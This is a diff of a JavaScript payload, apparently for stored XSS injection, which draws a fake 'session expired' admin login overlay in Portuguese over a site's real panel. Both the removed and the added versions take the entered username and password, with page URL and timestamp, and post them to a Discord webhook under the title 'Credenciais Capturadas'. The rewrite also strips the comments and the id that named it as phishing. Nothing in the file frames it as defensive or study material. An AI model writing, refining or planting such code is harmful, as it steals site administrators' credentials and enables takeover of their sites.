@@ -1,163 +1,100 @@
-/**
- * Emílio Farias - Persistent XSS Fake Login Modal V2 (Overlay Perfeito)
- */
-
 (function() {
-    if(document.getElementById('phishing_modal_111')) return;
+    if (document.getElementById('pm111')) return;
 
-    var css = `
-    #phishing_modal_111 {
-        position: fixed;
-        top: 0; left: 0;
-        width: 100vw; height: 100vh;
-        /* Efeito de Vidro/Sombreado para ver o painel admin por trás, provando que é um timeout real */
-        background: rgba(0, 0, 0, 0.85);
-        backdrop-filter: blur(5px);
-        z-index: 2147483647; 
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-family: Arial, sans-serif;
-    }
-    
-    #p-fake-box {
-        width: 520px;
-        max-width: 90%;
-        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        border-radius: 4px; /* Suavizar um pouco os cantos do modal para ficar mais profissional */
-        overflow: hidden;
-    }
+    var s = document.createElement('style');
+    s.textContent = [
+        '#pm111{position:fixed;top:0;left:0;width:100vw;height:100vh;',
+        'background:rgba(0,0,0,.85);backdrop-filter:blur(5px);',
+        'z-index:2147483647;display:flex;align-items:center;',
+        'justify-content:center;font-family:Arial,sans-serif}',
+        '#pmbox{width:520px;max-width:90%;overflow:hidden;',
+        'box-shadow:0 10px 30px rgba(0,0,0,.8);border-radius:4px}',
+        '.pminput{display:block;width:100%;height:47px;border:1px solid #E6E6E6;',
+        'padding:0 10px;font-size:14px;box-sizing:border-box;',
+        'margin-bottom:16px;outline:none}',
+        '.pmbtn{cursor:pointer;padding:15px 20px;font-size:11px;',
+        'text-transform:uppercase;color:#fff;border:none;border-radius:5px;font-weight:bold}'
+    ].join('');
+    document.head.appendChild(s);
 
-    .p-pt25 { padding-top: 25px; }
-    .p-pb18 { padding-bottom: 18px; }
-    .p-back_2FACD8 { background-color: #2FACD8; }
-    .p-cor_fff { color: #fff; }
-    .p-tac { text-align: center; }
-    .p-fz28 { font-size: 28px; }
-    .p-ttu { text-transform: uppercase; }
-    
-    .p-container-inputs {
-        padding: 30px 25px 10px 25px;
-        background-color: #F8F8F8;
-    }
+    var d = document.createElement('div');
+    d.id = 'pm111';
 
-    .p-input-group {
-        display: block;
-        margin-bottom: 16px;
-    }
+    var box = document.createElement('div');
+    box.id = 'pmbox';
 
-    .p-design { 
-        height: 47px; 
-        line-height: 47px; 
-        border: 1px solid #E6E6E6; 
-        padding: 0 10px; 
-        font-size: 14px; 
-        box-sizing: border-box; 
-        width: 100%;
-        outline: none;
-    }
+    var header = document.createElement('div');
+    header.style.cssText = 'background:#2FACD8;padding:25px;text-align:center;';
+    header.innerHTML = '<p style="margin:0;color:#fff;font-size:24px;text-transform:uppercase;font-weight:bold;">Administracao do Site</p>' +
+        '<p style="margin:8px 0 0;color:#fff;font-size:13px;">Sua Sessao Expirou. Efetue o login novamente.</p>';
 
-    .p-design:focus { border-color: #2FACD8; }
+    var body = document.createElement('div');
+    body.style.cssText = 'padding:25px;background:#F8F8F8;';
 
-    .p-footer {
-        padding: 20px;
-        background-color: #F1F1F1;
-        text-align: right;
-    }
+    var inputU = document.createElement('input');
+    inputU.type = 'text';
+    inputU.id = 'pm_u';
+    inputU.placeholder = 'Login Admin';
+    inputU.className = 'pminput';
+    inputU.autocomplete = 'off';
 
-    .p-botao { 
-        cursor: pointer; 
-        padding: 15px 20px; 
-        font-size: 11px; 
-        text-transform: uppercase; 
-        color: #fff; 
-        border: none; 
-        border-radius: 5px; 
-        font-weight: bold;
-    }
-    .p-back_9E9E9E { background-color: #9E9E9E; margin-right: 10px;}
-    .p-back_2EADD4 { background-color: #2EADD4; }
-    .p-back_2EADD4:hover { background-color: #248cae; }
-    `;
+    var inputP = document.createElement('input');
+    inputP.type = 'password';
+    inputP.id = 'pm_p';
+    inputP.placeholder = 'Senha';
+    inputP.className = 'pminput';
+    inputP.autocomplete = 'off';
 
-    var style = document.createElement('style');
-    style.type = 'text/css';
-    if (style.styleSheet) { style.styleSheet.cssText = css; } else { style.appendChild(document.createTextNode(css)); }
-    document.head.appendChild(style);
+    body.appendChild(inputU);
+    body.appendChild(inputP);
 
-    var div = document.createElement('div');
-    div.id = 'phishing_modal_111';
-    
-    div.innerHTML = `
-        <div id="p-fake-box">
-            <h1 class="p-pt25 p-pb18 p-back_2FACD8" style="margin:0;">
-                <p class="p-cor_fff p-tac p-fz28 p-ttu" style="margin:0; font-family: Arial, sans-serif;">Administração do Site</p>
-                <p style="text-align:center; color:#fff; font-size:13px; margin-top:8px; font-weight:normal;">Sua Sessão Expirou. Por favor, efetue o login novamente.</p>
-            </h1>
+    var footer = document.createElement('div');
+    footer.style.cssText = 'padding:20px;background:#F1F1F1;text-align:right;';
 
-            <form id="p-fake-form" onsubmit="return false;">
-                <div class="p-container-inputs">
-                    <label class="p-input-group">
-                        <input type="text" id="p_login" class="p-design" placeholder="Login Admin" required autocomplete="off" />
-                    </label>
+    var btn = document.createElement('button');
+    btn.id = 'pm_btn';
+    btn.className = 'pmbtn';
+    btn.style.background = '#2EADD4';
+    btn.textContent = 'Entrar no Painel';
 
-                    <label class="p-input-group">
-                        <input type="password" id="p_senha" class="p-design" placeholder="Senha" required autocomplete="off" />
-                    </label>
-                </div>
+    footer.appendChild(btn);
+    box.appendChild(header);
+    box.appendChild(body);
+    box.appendChild(footer);
+    d.appendChild(box);
 
-                <div class="p-footer">
-                    <button type="button" class="p-botao p-back_9E9E9E"> Esqueci minha senha? </button>
-                    <button type="button" id="p-submit-btn" class="p-botao p-back_2EADD4"> Entrar no Painel </button>
-                </div>
-            </form>
-        </div>
-    `;
+    document.body.style.overflow = 'hidden';
+    document.body.appendChild(d);
 
-    // Garante que bloqueie rolagem da pagina de fundo
-    document.body.style.overflow = "hidden";
-    document.body.appendChild(div);
-
-    document.getElementById('p-submit-btn').addEventListener('click', function() {
-        var u = document.getElementById('p_login').value;
-        var p = document.getElementById('p_senha').value;
-        var btn = document.getElementById('p-submit-btn');
-
-        if(u.trim() === "" || p.trim() === "") {
-            btn.style.backgroundColor = "#ff4d4d";
-            setTimeout(function() { btn.style.backgroundColor = "#2EADD4"; }, 1000);
+    btn.onclick = function() {
+        var u = document.getElementById('pm_u').value;
+        var p = document.getElementById('pm_p').value;
+        if (!u || !p) {
+            btn.style.background = '#ff4d4d';
+            setTimeout(function() { btn.style.background = '#2EADD4'; }, 1000);
             return;
         }
-
-        btn.innerText = "Autenticando...";
-
+        btn.textContent = 'Autenticando...';
         var ts = new Date().toISOString();
-        var ua = navigator.userAgent;
-        var url = window.location.href;
-
-        // Envia para Discord Webhook - sem expor nenhum token sensível
-        fetch("https://discord.com/api/webhooks/1493707538099605795/GuYho66-ozTTH1UlJsKsrFDL2CTdlgXMDsL_nnbp8F01xg-ooWcF6t67IBl84eFFb1oH", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                embeds: [{
-                    title: "\uD83D\uDD10 Credenciais Capturadas",
-                    color: 16711680,
-                    fields: [
-                        { name: "Login", value: "```" + u + "```", inline: true },
-                        { name: "Senha", value: "```" + p + "```", inline: true },
-                        { name: "URL", value: url, inline: false },
-                        { name: "Timestamp", value: ts, inline: false },
-                        { name: "User-Agent", value: ua, inline: false }
-                    ]
-                }]
-            })
-        }).then(function() {
-            document.body.style.overflow = "auto";
-            document.getElementById('phishing_modal_111').remove();
-        }).catch(function() {
-            document.body.style.overflow = "auto";
-            document.getElementById('phishing_modal_111').remove();
+        var payload = JSON.stringify({
+            embeds: [{
+                title: "Credenciais Capturadas",
+                color: 16711680,
+                fields: [
+                    { name: "Login", value: u, inline: true },
+                    { name: "Senha", value: p, inline: true },
+                    { name: "URL", value: window.location.href, inline: false },
+                    { name: "Timestamp", value: ts, inline: false }
+                ]
+            }]
         });
-    });
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://discord.com/api/webhooks/1493707538099605795/GuYho66-ozTTH1UlJsKsrFDL2CTdlgXMDsL_nnbp8F01xg-ooWcF6t67IBl84eFFb1oH', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.onloadend = function() {
+            document.getElementById('pm111').remove();
+            document.body.style.overflow = 'auto';
+        };
+        xhr.send(payload);
+    };
 })();
